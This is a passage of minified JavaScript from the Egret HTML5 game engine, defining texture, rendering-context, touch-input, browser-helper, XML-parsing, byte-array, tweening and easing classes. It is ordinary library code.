    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this._textureHeight = this._textureWidth = this._offsetY = this._offsetX = this._bitmapHeight = this._bitmapWidth = this._bitmapY = this._bitmapX = 0
        }

        __extends(a, d);
        Object.defineProperty(a.prototype, "textureWidth", {
            get: function () {
                return this._textureWidth
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "textureHeight", {
            get: function () {
                return this._textureHeight
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "bitmapData",
            {
                get: function () {
                    return this._bitmapData
                }, enumerable: !0, configurable: !0
            });
        a.prototype._setBitmapData = function (c) {
            var a = b.MainContext.instance.rendererContext.texture_scale_factor;
            this._bitmapData = c;
            this._sourceWidth = c.width;
            this._sourceHeight = c.height;
            this._textureWidth = this._sourceWidth * a;
            this._textureHeight = this._sourceHeight * a;
            this._bitmapWidth = this._textureWidth;
            this._bitmapHeight = this._textureHeight;
            this._offsetX = this._offsetY = this._bitmapX = this._bitmapY = 0
        };
        a.prototype.getPixel32 = function (c, a) {
            return this._bitmapData.getContext("2d").getImageData(c,
                a, 1, 1).data
        };
        return a
    }(b.HashObject);
    b.Texture = e;
    e.prototype.__class__ = "egret.Texture"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this._bitmapData = document.createElement("canvas");
            this.renderContext = b.RendererContext.createRendererContext(this._bitmapData)
        }

        __extends(a, d);
        a.prototype.drawToTexture = function (c) {
            var a = this._bitmapData, d = c.getBounds(b.Rectangle.identity);
            a.width = d.width;
            a.height = d.height;
            c._worldTransform.identity();
            c.worldAlpha = 1;
            if (c instanceof b.DisplayObjectContainer) {
                var a = c._anchorOffsetX, e = c._anchorOffsetY;
                if (0 != c._anchorX || 0 != c._anchorY)a = c._anchorX *
                d.width, e = c._anchorY * d.height;
                this._offsetX = d.x + a;
                this._offsetY = d.y + e;
                c._worldTransform.append(1, 0, 0, 1, -this._offsetX, -this._offsetY);
                d = c._children;
                a = 0;
                for (e = d.length; a < e; a++)d[a]._updateTransform()
            }
            d = b.RenderFilter.getInstance();
            a = d._drawAreaList.concat();
            d._drawAreaList.length = 0;
            this.renderContext.clearScreen();
            this.webGLTexture = null;
            (e = c.mask || c._scrollRect) && this.renderContext.pushMask(e);
            c._render(this.renderContext);
            e && this.renderContext.popMask();
            d._drawAreaList = a;
            this._textureWidth = this._bitmapData.width;
            this._textureHeight = this._bitmapData.height;
            this._sourceWidth = this._textureWidth;
            this._sourceHeight = this._textureHeight
        };
        return a
    }(b.Texture);
    b.RenderTexture = e;
    e.prototype.__class__ = "egret.RenderTexture"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this.renderCost = 0;
            this.texture_scale_factor = 1;
            this.profiler = b.Profiler.getInstance()
        }

        __extends(a, d);
        a.prototype.clearScreen = function () {
        };
        a.prototype.clearRect = function (c, a, b, d) {
        };
        a.prototype.drawImage = function (c, a, b, d, e, f, h, p, m, q) {
            this.profiler.onDrawImage()
        };
        a.prototype.setTransform = function (c) {
        };
        a.prototype.setAlpha = function (c, a) {
        };
        a.prototype.setupFont = function (c) {
        };
        a.prototype.measureText = function (c) {
            return 0
        };
        a.prototype.drawText = function (c,
                                         a, b, d, e) {
            this.profiler.onDrawImage()
        };
        a.prototype.strokeRect = function (c, a, b, d, e) {
        };
        a.prototype.pushMask = function (c) {
        };
        a.prototype.popMask = function () {
        };
        a.prototype.onRenderStart = function () {
        };
        a.prototype.onRenderFinish = function () {
        };
        a.prototype.setGlobalColorTransform = function (c) {
        };
        a.createRendererContext = function (c) {
            return null
        };
        return a
    }(b.HashObject);
    b.RendererContext = e;
    e.prototype.__class__ = "egret.RendererContext"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.MOUSE = "mouse";
        b.TOUCH = "touch";
        b.mode = "touch";
        return b
    }();
    b.InteractionMode = e;
    e.prototype.__class__ = "egret.InteractionMode"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this._currentTouchTarget = {};
            this.maxTouches = 2;
            this.touchDownTarget = {};
            this.touchingIdentifiers = [];
            this.lastTouchY = this.lastTouchX = -1
        }

        __extends(a, d);
        a.prototype.run = function () {
        };
        a.prototype.getTouchData = function (c, a, b) {
            var d = this._currentTouchTarget[c];
            null == d && (d = {}, this._currentTouchTarget[c] = d);
            d.stageX = a;
            d.stageY = b;
            d.identifier = c;
            return d
        };
        a.prototype.dispatchEvent = function (c, a) {
            b.TouchEvent.dispatchTouchEvent(a.target, c, a.identifier, a.stageX,
                a.stageY, !1, !1, !1, !0 == this.touchDownTarget[a.identifier])
        };
        a.prototype.onTouchBegan = function (c, a, d) {
            if (this.touchingIdentifiers.length != this.maxTouches) {
                var e = b.MainContext.instance.stage.hitTest(c, a);
                e && (c = this.getTouchData(d, c, a), this.touchDownTarget[d] = !0, c.target = e, c.beginTarget = e, this.dispatchEvent(b.TouchEvent.TOUCH_BEGIN, c));
                this.touchingIdentifiers.push(d)
            }
        };
        a.prototype.onTouchMove = function (c, a, d) {
            if (-1 != this.touchingIdentifiers.indexOf(d) && (c != this.lastTouchX || a != this.lastTouchY)) {
                this.lastTouchX =
                    c;
                this.lastTouchY = a;
                var e = b.MainContext.instance.stage.hitTest(c, a);
                e && (c = this.getTouchData(d, c, a), c.target = e, this.dispatchEvent(b.TouchEvent.TOUCH_MOVE, c))
            }
        };
        a.prototype.onTouchEnd = function (c, a, d) {
            var e = this.touchingIdentifiers.indexOf(d);
            -1 != e && (this.touchingIdentifiers.splice(e, 1), e = b.MainContext.instance.stage.hitTest(c, a)) && (c = this.getTouchData(d, c, a), delete this.touchDownTarget[d], d = c.beginTarget, c.target = e, this.dispatchEvent(b.TouchEvent.TOUCH_END, c), d == e ? this.dispatchEvent(b.TouchEvent.TOUCH_TAP,
                c) : c.beginTarget && (c.target = c.beginTarget, this.dispatchEvent(b.TouchEvent.TOUCH_RELEASE_OUTSIDE, c)), delete this._currentTouchTarget[c.identifier])
        };
        return a
    }(b.HashObject);
    b.TouchContext = e;
    e.prototype.__class__ = "egret.TouchContext"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this)
        }

        __extends(a, d);
        a.prototype.proceed = function (c) {
        };
        a._getUrl = function (c) {
            var a = c.url;
            -1 == a.indexOf("?") && c.method == b.URLRequestMethod.GET && c.data && c.data instanceof b.URLVariables && (a = a + "?" + c.data.toString());
            return a
        };
        return a
    }(b.HashObject);
    b.NetContext = e;
    e.prototype.__class__ = "egret.NetContext"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a() {
            b.call(this);
            this.frameRate = 60
        }

        __extends(a, b);
        a.prototype.executeMainLoop = function (c, a) {
        };
        return a
    }(b.HashObject);
    b.DeviceContext = e;
    e.prototype.__class__ = "egret.DeviceContext"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.call = function (a, c) {
        };
        b.addCallback = function (a, c) {
        };
        return b
    }();
    b.ExternalInterface = e;
    e.prototype.__class__ = "egret.ExternalInterface"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this.ua = navigator.userAgent.toLowerCase();
            this.trans = this._getTrans()
        }

        __extends(a, d);
        a.getInstance = function () {
            null == a.instance && (a.instance = new a);
            return a.instance
        };
        Object.defineProperty(a.prototype, "isMobile", {
            get: function () {
                b.Logger.warning("Browser.isMobile\u63a5\u53e3\u53c2\u6570\u5df2\u7ecf\u53d8\u66f4\uff0c\u8bf7\u5c3d\u5feb\u8c03\u6574\u7528\u6cd5\u4e3a egret.MainContext.deviceType == egret.MainContext.DEVICE_MOBILE ");
                return b.MainContext.deviceType ==
                    b.MainContext.DEVICE_MOBILE
            }, enumerable: !0, configurable: !0
        });
        a.prototype._getHeader = function (c) {
            if ("transform"in c)return "";
            for (var a = ["webkit", "ms", "Moz", "O"], b = 0; b < a.length; b++)if (a[b] + "Transform"in c)return a[b];
            return ""
        };
        a.prototype._getTrans = function () {
            var c = document.createElement("div").style, c = this._getHeader(c);
            return "" == c ? "transform" : c + "Transform"
        };
        a.prototype.$new = function (c) {
            return this.$(document.createElement(c))
        };
        a.prototype.$ = function (c) {
            var d = document;
            if (c = c instanceof HTMLElement ?
                    c : d.querySelector(c))c.find = c.find || this.$, c.hasClass = c.hasClass || function (c) {
                return this.className.match(new RegExp("(\\s|^)" + c + "(\\s|$)"))
            }, c.addClass = c.addClass || function (c) {
                this.hasClass(c) || (this.className && (this.className += " "), this.className += c);
                return this
            }, c.removeClass = c.removeClass || function (c) {
                this.hasClass(c) && (this.className = this.className.replace(c, ""));
                return this
            }, c.remove = c.remove || function () {
            }, c.appendTo = c.appendTo || function (c) {
                c.appendChild(this);
                return this
            }, c.prependTo = c.prependTo ||
            function (c) {
                c.childNodes[0] ? c.insertBefore(this, c.childNodes[0]) : c.appendChild(this);
                return this
            }, c.transforms = c.transforms || function () {
                this.style[a.getInstance().trans] = a.getInstance().translate(this.position) + a.getInstance().rotate(this.rotation) + a.getInstance().scale(this.scale) + a.getInstance().skew(this.skew);
                return this
            }, c.position = c.position || {x: 0, y: 0}, c.rotation = c.rotation || 0, c.scale = c.scale || {
                x: 1,
                y: 1
            }, c.skew = c.skew || {x: 0, y: 0}, c.translates = function (c, a) {
                this.position.x = c;
                this.position.y = a -
                b.MainContext.instance.stage.stageHeight;
                this.transforms();
                return this
            }, c.rotate = function (c) {
                this.rotation = c;
                this.transforms();
                return this
            }, c.resize = function (c, a) {
                this.scale.x = c;
                this.scale.y = a;
                this.transforms();
                return this
            }, c.setSkew = function (c, a) {
                this.skew.x = c;
                this.skew.y = a;
                this.transforms();
                return this
            };
            return c
        };
        a.prototype.translate = function (c) {
            return "translate(" + c.x + "px, " + c.y + "px) "
        };
        a.prototype.rotate = function (c) {
            return "rotate(" + c + "deg) "
        };
        a.prototype.scale = function (c) {
            return "scale(" + c.x + ", " +
                c.y + ") "
        };
        a.prototype.skew = function (c) {
            return "skewX(" + -c.x + "deg) skewY(" + c.y + "deg)"
        };
        return a
    }(b.HashObject);
    b.Browser = e;
    e.prototype.__class__ = "egret.Browser"
})(egret || (egret = {}));
(function (b) {
    (function (b) {
        b.getItem = function (b) {
            return null
        };
        b.setItem = function (b, a) {
            return !1
        };
        b.removeItem = function (b) {
        };
        b.clear = function () {
        }
    })(b.localStorage || (b.localStorage = {}))
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function d() {
        }

        d.parse = function (a) {
            a = b.SAXParser.getInstance().parserXML(a);
            if (!a || !a.childNodes)return null;
            for (var c = a.childNodes.length, e = !1, l = 0; l < c; l++) {
                var n = a.childNodes[l];
                if (1 == n.nodeType) {
                    e = !0;
                    break
                }
            }
            return e ? d.parseNode(n) : null
        };
        d.parseNode = function (a) {
            if (!a || 1 != a.nodeType)return null;
            var c = {};
            c.localName = a.localName;
            c.name = a.nodeName;
            a.namespaceURI && (c.namespace = a.namespaceURI);
            a.prefix && (c.prefix = a.prefix);
            for (var b = a.attributes, e = b.length, n = 0; n < e; n++) {
                var g =
                    b[n], f = g.name;
                0 != f.indexOf("xmlns:") && (c["$" + f] = g.value)
            }
            b = a.childNodes;
            e = b.length;
            for (n = 0; n < e; n++)if (g = d.parseNode(b[n]))c.children || (c.children = []), g.parent = c, c.children.push(g);
            !c.children && (a = a.textContent.trim()) && (c.text = a);
            return c
        };
        d.findChildren = function (a, c, b) {
            b ? b.length = 0 : b = [];
            d.findByPath(a, c, b);
            return b
        };
        d.findByPath = function (a, c, b) {
            var e = c.indexOf("."), n;
            -1 == e ? (n = c, e = !0) : (n = c.substring(0, e), c = c.substring(e + 1), e = !1);
            if (a = a.children)for (var g = a.length, f = 0; f < g; f++) {
                var h = a[f];
                h.localName ==
                n && (e ? b.push(h) : d.findByPath(h, c, b))
            }
        };
        d.getAttributes = function (a, c) {
            c ? c.length = 0 : c = [];
            for (var b in a)"$" == b.charAt(0) && c.push(b.substring(1));
            return c
        };
        return d
    }();
    b.XML = e;
    e.prototype.__class__ = "egret.XML"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function a() {
        }

        a.LITTLE_ENDIAN = "LITTLE_ENDIAN";
        a.BIG_ENDIAN = "BIG_ENDIAN";
        return a
    }();
    b.Endian = e;
    e.prototype.__class__ = "egret.Endian";
    var d = function () {
        function a() {
            this.length = this.position = 0;
            this._mode = "";
            this.maxlength = 0;
            this._endian = e.LITTLE_ENDIAN;
            this.isLittleEndian = !1;
            this._mode = "Typed array";
            this.maxlength = 4;
            this.arraybytes = new ArrayBuffer(this.maxlength);
            this.unalignedarraybytestemp = new ArrayBuffer(16);
            this.endian = a.DEFAULT_ENDIAN
        }

        Object.defineProperty(a.prototype,
            "endian", {
                get: function () {
                    return this._endian
                }, set: function (c) {
                    this._endian = c;
                    this.isLittleEndian = c == e.LITTLE_ENDIAN
                }, enumerable: !0, configurable: !0
            });
        a.prototype.ensureWriteableSpace = function (c) {
            this.ensureSpace(c + this.position)
        };
        a.prototype.setArrayBuffer = function (c) {
            this.ensureSpace(c.byteLength);
            this.length = c.byteLength;
            c = new Int8Array(c);
            (new Int8Array(this.arraybytes, 0, this.length)).set(c);
            this.position = 0
        };
        Object.defineProperty(a.prototype, "bytesAvailable", {
            get: function () {
                return this.length - this.position
            },
            enumerable: !0, configurable: !0
        });
        a.prototype.ensureSpace = function (c) {
            if (c > this.maxlength) {
                c = c + 255 & -256;
                var a = new ArrayBuffer(c), b = new Uint8Array(this.arraybytes, 0, this.length);
                (new Uint8Array(a, 0, this.length)).set(b);
                this.arraybytes = a;
                this.maxlength = c
            }
        };
        a.prototype.writeByte = function (c) {
            this.ensureWriteableSpace(1);
            (new Int8Array(this.arraybytes))[this.position++] = ~~c;
            this.position > this.length && (this.length = this.position)
        };
        a.prototype.readByte = function () {
            if (this.position >= this.length)throw"ByteArray out of bounds read. Positon=" +
            this.position + ", Length=" + this.length;
            return (new Int8Array(this.arraybytes))[this.position++]
        };
        a.prototype.readBytes = function (c, a, b) {
            void 0 === a && (a = 0);
            void 0 === b && (b = 0);
            null == b && (b = c.length);
            c.ensureWriteableSpace(a + b);
            var d = new Int8Array(c.arraybytes), e = new Int8Array(this.arraybytes);
            d.set(e.subarray(this.position, this.position + b), a);
            this.position += b;
            b + a > c.length && (c.length += b + a - c.length)
        };
        a.prototype.writeUnsignedByte = function (c) {
            this.ensureWriteableSpace(1);
            (new Uint8Array(this.arraybytes))[this.position++] =
                ~~c & 255;
            this.position > this.length && (this.length = this.position)
        };
        a.prototype.readUnsignedByte = function () {
            if (this.position >= this.length)throw"ByteArray out of bounds read. Positon=" + this.position + ", Length=" + this.length;
            return (new Uint8Array(this.arraybytes))[this.position++]
        };
        a.prototype.writeUnsignedShort = function (c) {
            this.ensureWriteableSpace(2);
            if (0 == (this.position & 1)) {
                var a = new Uint16Array(this.arraybytes);
                a[this.position >> 1] = ~~c & 65535
            } else a = new Uint16Array(this.unalignedarraybytestemp, 0, 1), a[0] =
                ~~c & 65535, c = new Uint8Array(this.arraybytes, this.position, 2), a = new Uint8Array(this.unalignedarraybytestemp, 0, 2), c.set(a);
            this.position += 2;
            this.position > this.length && (this.length = this.position)
        };
        a.prototype.readUTFBytes = function (c) {
            var a = "";
            c = this.position + c;
            for (var b = new DataView(this.arraybytes); this.position < c;) {
                var d = b.getUint8(this.position++);
                if (128 > d) {
                    if (0 == d)break;
                    a += String.fromCharCode(d)
                } else if (224 > d)a += String.fromCharCode((d & 63) << 6 | b.getUint8(this.position++) & 127); else if (240 > d)var e = b.getUint8(this.position++),
                    a = a + String.fromCharCode((d & 31) << 12 | (e & 127) << 6 | b.getUint8(this.position++) & 127); else var e = b.getUint8(this.position++), f = b.getUint8(this.position++), a = a + String.fromCharCode((d & 15) << 18 | (e & 127) << 12 | f << 6 & 127 | b.getUint8(this.position++) & 127)
            }
            return a
        };
        a.prototype.readInt = function () {
            var c = (new DataView(this.arraybytes)).getInt32(this.position, this.isLittleEndian);
            this.position += 4;
            return c
        };
        a.prototype.readShort = function () {
            var c = (new DataView(this.arraybytes)).getInt16(this.position, this.isLittleEndian);
            this.position += 2;
            return c
        };
        a.prototype.readDouble = function () {
            var c = (new DataView(this.arraybytes)).getFloat64(this.position, this.isLittleEndian);
            this.position += 8;
            return c
        };
        a.prototype.readUnsignedShort = function () {
            if (this.position > this.length + 2)throw"ByteArray out of bounds read. Position=" + this.position + ", Length=" + this.length;
            if (0 == (this.position & 1)) {
                var c = new Uint16Array(this.arraybytes), a = this.position >> 1;
                this.position += 2;
                return c[a]
            }
            c = new Uint16Array(this.unalignedarraybytestemp, 0, 1);
            a = new Uint8Array(this.arraybytes,
                this.position, 2);
            (new Uint8Array(this.unalignedarraybytestemp, 0, 2)).set(a);
            this.position += 2;
            return c[0]
        };
        a.prototype.writeUnsignedInt = function (c) {
            this.ensureWriteableSpace(4);
            if (0 == (this.position & 3)) {
                var a = new Uint32Array(this.arraybytes);
                a[this.position >> 2] = ~~c & 4294967295
            } else a = new Uint32Array(this.unalignedarraybytestemp, 0, 1), a[0] = ~~c & 4294967295, c = new Uint8Array(this.arraybytes, this.position, 4), a = new Uint8Array(this.unalignedarraybytestemp, 0, 4), c.set(a);
            this.position += 4;
            this.position > this.length &&
            (this.length = this.position)
        };
        a.prototype.readUnsignedInt = function () {
            if (this.position > this.length + 4)throw"ByteArray out of bounds read. Position=" + this.position + ", Length=" + this.length;
            if (0 == (this.position & 3)) {
                var c = new Uint32Array(this.arraybytes), a = this.position >> 2;
                this.position += 4;
                return c[a]
            }
            c = new Uint32Array(this.unalignedarraybytestemp, 0, 1);
            a = new Uint8Array(this.arraybytes, this.position, 4);
            (new Uint8Array(this.unalignedarraybytestemp, 0, 4)).set(a);
            this.position += 4;
            return c[0]
        };
        a.prototype.writeFloat =
            function (c) {
                this.ensureWriteableSpace(4);
                if (0 == (this.position & 3)) {
                    var a = new Float32Array(this.arraybytes);
                    a[this.position >> 2] = c
                } else a = new Float32Array(this.unalignedarraybytestemp, 0, 1), a[0] = c, c = new Uint8Array(this.arraybytes, this.position, 4), a = new Uint8Array(this.unalignedarraybytestemp, 0, 4), c.set(a);
                this.position += 4;
                this.position > this.length && (this.length = this.position)
            };
        a.prototype.readFloat = function () {
            if (this.position > this.length + 4)throw"ByteArray out of bounds read. Positon=" + this.position + ", Length=" +
            this.length;
            if (0 == (this.position & 3)) {
                var c = new Float32Array(this.arraybytes), a = this.position >> 2;
                this.position += 4;
                return c[a]
            }
            c = new Float32Array(this.unalignedarraybytestemp, 0, 1);
            a = new Uint8Array(this.arraybytes, this.position, 4);
            (new Uint8Array(this.unalignedarraybytestemp, 0, 4)).set(a);
            this.position += 4;
            return c[0]
        };
        a.DEFAULT_ENDIAN = e.BIG_ENDIAN;
        return a
    }();
    b.ByteArray = d;
    d.prototype.__class__ = "egret.ByteArray"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c, a, b) {
            d.call(this);
            this._target = null;
            this.loop = this.ignoreGlobalPause = this._useTicks = !1;
            this._actions = this._steps = this.pluginData = null;
            this.paused = !1;
            this.duration = 0;
            this._prevPos = -1;
            this.position = null;
            this._stepPosition = this._prevPosition = 0;
            this.passive = !1;
            this.initialize(c, a, b)
        }

        __extends(a, d);
        a.get = function (c, b, d, e) {
            void 0 === b && (b = null);
            void 0 === d && (d = null);
            void 0 === e && (e = !1);
            e && a.removeTweens(c);
            return new a(c, b, d)
        };
        a.removeTweens = function (c) {
            if (c.tween_count) {
                for (var b =
                    a._tweens, d = b.length - 1; 0 <= d; d--)b[d]._target == c && (b[d].paused = !0, b.splice(d, 1));
                c.tween_count = 0
            }
        };
        a.pauseTweens = function (c) {
            if (c.tween_count)for (var a = b.Tween._tweens, d = a.length - 1; 0 <= d; d--)a[d]._target == c && (a[d].paused = !0)
        };
        a.resumeTweens = function (c) {
            if (c.tween_count)for (var a = b.Tween._tweens, d = a.length - 1; 0 <= d; d--)a[d]._target == c && (a[d].paused = !1)
        };
        a.tick = function (c, b) {
            void 0 === b && (b = !1);
            for (var d = a._tweens.concat(), e = d.length - 1; 0 <= e; e--) {
                var g = d[e];
                b && !g.ignoreGlobalPause || g.paused || g.tick(g._useTicks ?
                    1 : c)
            }
        };
        a._register = function (c, d) {
            var e = c._target, n = a._tweens;
            if (d)e && (e.tween_count = e.tween_count ? e.tween_count + 1 : 1), n.push(c), a._inited || (b.Ticker.getInstance().register(a.tick, null), a._inited = !0); else for (e && e.tween_count--, e = n.length; e--;)if (n[e] == c) {
                n.splice(e, 1);
                break
            }
        };
        a.removeAllTweens = function () {
            for (var c = a._tweens, b = 0, d = c.length; b < d; b++) {
                var e = c[b];
                e.paused = !0;
                e._target.tweenjs_count = 0
            }
            c.length = 0
        };
        a.prototype.initialize = function (c, b, d) {
            this._target = c;
            b && (this._useTicks = b.useTicks, this.ignoreGlobalPause =
                b.ignoreGlobalPause, this.loop = b.loop, b.onChange && this.addEventListener("change", b.onChange, b.onChangeObj), b.override && a.removeTweens(c));
            this.pluginData = d || {};
            this._curQueueProps = {};
            this._initQueueProps = {};
            this._steps = [];
            this._actions = [];
            b && b.paused ? this.paused = !0 : a._register(this, !0);
            b && null != b.position && this.setPosition(b.position, a.NONE)
        };
        a.prototype.setPosition = function (c, a) {
            void 0 === a && (a = 1);
            0 > c && (c = 0);
            var b = c, d = !1;
            b >= this.duration && (this.loop ? b %= this.duration : (b = this.duration, d = !0));
            if (b == this._prevPos)return d;
            var e = this._prevPos;
            this.position = this._prevPos = b;
            this._prevPosition = c;
            if (this._target)if (d)this._updateTargetProps(null, 1); else if (0 < this._steps.length) {
                for (var f = 0, h = this._steps.length; f < h && !(this._steps[f].t > b); f++);
                f = this._steps[f - 1];
                this._updateTargetProps(f, (this._stepPosition = b - f.t) / f.d)
            }
            0 != a && 0 < this._actions.length && (this._useTicks ? this._runActions(b, b) : 1 == a && b < e ? (e != this.duration && this._runActions(e, this.duration), this._runActions(0, b, !0)) : this._runActions(e, b));
            d && this.setPaused(!0);
            this.dispatchEventWith("change");
            return d
        };
        a.prototype._runActions = function (c, a, b) {
            void 0 === b && (b = !1);
            var d = c, e = a, f = -1, h = this._actions.length, p = 1;
            c > a && (d = a, e = c, f = h, h = p = -1);
            for (; (f += p) != h;) {
                a = this._actions[f];
                var m = a.t;
                (m == e || m > d && m < e || b && m == c) && a.f.apply(a.o, a.p)
            }
        };
        a.prototype._updateTargetProps = function (c, b) {
            var d, e, g, f;
            if (c || 1 != b) {
                if (this.passive = !!c.v)return;
                c.e && (b = c.e(b, 0, 1, 1));
                d = c.p0;
                e = c.p1
            } else this.passive = !1, d = e = this._curQueueProps;
            for (var h in this._initQueueProps) {
                null == (g = d[h]) && (d[h] = g = this._initQueueProps[h]);
                null ==
                (f = e[h]) && (e[h] = f = g);
                g = g == f || 0 == b || 1 == b || "number" != typeof g ? 1 == b ? f : g : g + (f - g) * b;
                var p = !1;
                if (f = a._plugins[h])for (var m = 0, q = f.length; m < q; m++) {
                    var r = f[m].tween(this, h, g, d, e, b, !!c && d == e, !c);
                    r == a.IGNORE ? p = !0 : g = r
                }
                p || (this._target[h] = g)
            }
        };
        a.prototype.setPaused = function (c) {
            this.paused = c;
            a._register(this, !c);
            return this
        };
        a.prototype._cloneProps = function (c) {
            var a = {}, b;
            for (b in c)a[b] = c[b];
            return a
        };
        a.prototype._addStep = function (c) {
            0 < c.d && (this._steps.push(c), c.t = this.duration, this.duration += c.d);
            return this
        };
        a.prototype._appendQueueProps = function (c) {
            var b, d, e, g, f, h;
            for (h in c)if (void 0 === this._initQueueProps[h]) {
                d = this._target[h];
                if (b = a._plugins[h])for (e = 0, g = b.length; e < g; e++)d = b[e].init(this, h, d);
                this._initQueueProps[h] = this._curQueueProps[h] = void 0 === d ? null : d
            }
            for (h in c) {
                d = this._curQueueProps[h];
                if (b = a._plugins[h])for (f = f || {}, e = 0, g = b.length; e < g; e++)b[e].step && b[e].step(this, h, d, c[h], f);
                this._curQueueProps[h] = c[h]
            }
            f && this._appendQueueProps(f);
            return this._curQueueProps
        };
        a.prototype._addAction = function (c) {
            c.t =
                this.duration;
            this._actions.push(c);
            return this
        };
        a.prototype._set = function (c, a) {
            for (var b in c)a[b] = c[b]
        };
        a.prototype.wait = function (c, a) {
            if (null == c || 0 >= c)return this;
            var b = this._cloneProps(this._curQueueProps);
            return this._addStep({d: c, p0: b, p1: b, v: a})
        };
        a.prototype.to = function (c, a, b) {
            void 0 === b && (b = void 0);
            if (isNaN(a) || 0 > a)a = 0;
            return this._addStep({
                d: a || 0,
                p0: this._cloneProps(this._curQueueProps),
                e: b,
                p1: this._cloneProps(this._appendQueueProps(c))
            })
        };
        a.prototype.call = function (c, a, b) {
            void 0 === a && (a = void 0);
            void 0 === b && (b = void 0);
            return this._addAction({f: c, p: b ? b : [], o: a ? a : this._target})
        };
        a.prototype.set = function (c, a) {
            void 0 === a && (a = null);
            return this._addAction({f: this._set, o: this, p: [c, a ? a : this._target]})
        };
        a.prototype.play = function (c) {
            c || (c = this);
            return this.call(c.setPaused, c, [!1])
        };
        a.prototype.pause = function (c) {
            c || (c = this);
            return this.call(c.setPaused, c, [!0])
        };
        a.prototype.tick = function (c) {
            this.paused || this.setPosition(this._prevPosition + c)
        };
        a.NONE = 0;
        a.LOOP = 1;
        a.REVERSE = 2;
        a._tweens = [];
        a.IGNORE = {};
        a._plugins =
        {};
        a._inited = !1;
        return a
    }(b.EventDispatcher);
    b.Tween = e;
    e.prototype.__class__ = "egret.Tween"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function d() {
            b.Logger.fatal("Ease\u4e0d\u80fd\u88ab\u5b9e\u4f8b\u5316")
        }

        d.get = function (a) {
            -1 > a && (a = -1);
            1 < a && (a = 1);
            return function (c) {
                return 0 == a ? c : 0 > a ? c * (c * -a + 1 + a) : c * ((2 - c) * a + (1 - a))
            }
        };
        d.getPowIn = function (a) {
            return function (c) {
                return Math.pow(c, a)
            }
        };
        d.getPowOut = function (a) {
            return function (c) {
                return 1 - Math.pow(1 - c, a)
            }
        };
        d.getPowInOut = function (a) {
            return function (c) {
                return 1 > (c *= 2) ? 0.5 * Math.pow(c, a) : 1 - 0.5 * Math.abs(Math.pow(2 - c, a))
            }
        };
        d.sineIn = function (a) {
            return 1 - Math.cos(a *
                Math.PI / 2)
        };
        d.sineOut = function (a) {
            return Math.sin(a * Math.PI / 2)
        };
        d.sineInOut = function (a) {
            return -0.5 * (Math.cos(Math.PI * a) - 1)
        };
        d.getBackIn = function (a) {
            return function (c) {
                return c * c * ((a + 1) * c - a)
            }
        };
        d.getBackOut = function (a) {
            return function (c) {
                return --c * c * ((a + 1) * c + a) + 1
            }
        };
        d.getBackInOut = function (a) {
            a *= 1.525;
            return function (c) {
                return 1 > (c *= 2) ? 0.5 * c * c * ((a + 1) * c - a) : 0.5 * ((c -= 2) * c * ((a + 1) * c + a) + 2)
            }
        };
        d.circIn = function (a) {
            return -(Math.sqrt(1 - a * a) - 1)
        };
        d.circOut = function (a) {
            return Math.sqrt(1 - --a * a)
        };
        d.circInOut = function (a) {
            return 1 >
            (a *= 2) ? -0.5 * (Math.sqrt(1 - a * a) - 1) : 0.5 * (Math.sqrt(1 - (a -= 2) * a) + 1)
        };
        d.bounceIn = function (a) {
            return 1 - d.bounceOut(1 - a)
        };
        d.bounceOut = function (a) {
            return a < 1 / 2.75 ? 7.5625 * a * a : a < 2 / 2.75 ? 7.5625 * (a -= 1.5 / 2.75) * a + 0.75 : a < 2.5 / 2.75 ? 7.5625 * (a -= 2.25 / 2.75) * a + 0.9375 : 7.5625 * (a -= 2.625 / 2.75) * a + 0.984375
        };
        d.bounceInOut = function (a) {
            return 0.5 > a ? 0.5 * d.bounceIn(2 * a) : 0.5 * d.bounceOut(2 * a - 1) + 0.5
        };
        d.getElasticIn = function (a, c) {
            var b = 2 * Math.PI;
            return function (d) {
                if (0 == d || 1 == d)return d;
                var e = c / b * Math.asin(1 / a);
                return -(a * Math.pow(2, 10 *
                (d -= 1)) * Math.sin((d - e) * b / c))
            }
        };
        d.getElasticOut = function (a, c) {
            var b = 2 * Math.PI;
            return function (d) {
